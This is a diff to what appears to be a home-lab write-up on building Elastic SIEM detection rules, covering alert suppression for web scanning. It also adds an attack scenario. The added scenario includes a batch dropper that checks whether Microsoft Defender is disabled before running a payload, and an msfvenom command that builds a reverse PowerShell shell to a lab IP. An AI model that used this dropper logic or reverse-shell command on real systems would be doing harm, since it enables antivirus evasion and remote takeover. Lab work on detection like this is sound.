@@ -430,7 +430,7 @@ Define Rule
 
 
 >[!NOTE]
-> The reason why alert suppression is needed is to avoid creating overwhelming alerts for essentially one large event. A web scanner may create thousands of connections for one specific destination IP address within a short period of time. Based on that, we can suppress by `destination.ip` and allow new alerts to be generated if a different web server is also being scanned.
+> The reason why alert suppression is needed is to avoid creating overwhelming alerts for essentially one large event. A web scanner may create thousands of connections for one specific destination IP address within a short period of time. Based on that, we can suppress by `destination.ip` and allow new alerts to be generated if a different web server is also being scanned. Otherwise, if the web scanning activity is only targeting one specific `destination.ip` witin the specified time window, we can treat it as one single large event instead of several small events.
 
 
 
@@ -482,23 +482,42 @@ After repeating our attack, we can see that alerts have been triggered within ou
 
 ![alert1_confirm](./images/alert1_confirm.png)
 
-![alert2_confirm](./images/alert1_confirm2.png)
+Here is the expanded alert details for our query-based Web Scanning Activity - Nmap/Nikto alert. The highlighted fields sections consists of fields taken from our query. Additionally, notice that under the Correlations section, there was over 6000 suppressed alerts for this one large event, or "source event". Imagine if we did not add alert suppression - we would have received over 6000 alerts for essentially the same event. 
+
+While each individual alert within the 6000 alerts may have had minor differences such as the web scanner crawling through a different url directory path, it may not have provided any additional and useful context, and simply overwhelm the SOC. If we are receiving this alert based on Nmap/Nikto, then we already know that our directories are being crawled through. If there was a need to alert on a specific web directory being scanned, then a separate alert should be created with a query that focuses in on that specific value within the `url.path` field.
+
+![alert1_confirm2](./images/alert1_confirm2.png)
+
+![alert1_suppress](./images/alert1_suppress.png)
+
+
+Here is the expanded alert details for our threshold-based Excessive Web Traffic alert. Notice that within the Highlighted Fields section, there were 6309 events that were consdiered to be part of the alert's trigger - yet we didn't have over 6000 alerts. That is due to grouping the `source.ip` and `destination.ip` together. This threshold alert looks for excessive web traffic/web scanning from one particular source IP address against one specific destination IP address. For simple web scanning, this threshold should cover the scenario without overwhelming the SOC with thousands of alerts for essentially the same activity.
+
+A good afterthought is how would we want to alert on a potential DDoS attack, where there are several IP addresses trying to overwhelm a single web server/destination IP address without accidently overwhelming the SOC with a lot of alerts?
 
 ![alert1_confirm3](./images/alert1_confirm3.png)
 
 
 
-
 # Alert Scenario 2
 
-
 ## Overview
+A dropper file will contain a script to determine if Microsoft Defender is enabled or disabled on the Windows 11 VM. If the Microsoft Defender is disabled, then the dropper file will then download a malicious script to execute a remote reverse shell to connect the Windows 11 VM to ParrotOS.
 
+Detections will be created to alert on downloading the initial dropper file, downloading the reverse shell script file, and the execution of a reverse shell connection. 
+
+The dropper file contains the below PowerShell script. In a nutshell, it runs the `Get-MPComputerStatus` command which returns a list of properties and their values (True, False, etc). The script then checks to see if the property `RealTimeProtectionEnabled` (Windows Defender) is equal to false. If the property value is equal to false, then execute the designated malicious payload script.
+
+```
+@ECHO OFF
+powershell -Command "& {if ((Get-MPComputerStatus).RealTimeProtectionEnabled -eq $false) {<MALICIOUS PAYLOAD SCRIPT>}}"
+```
 
 
 
 ## Conducting the Attack
 
+From the ParrotOS VM, run `msfvenom -p cmd/window/reverse_powershell lhost=192.168.56.104 lport=8443 > shell.bat` to open up Metasploit.
 
 
 
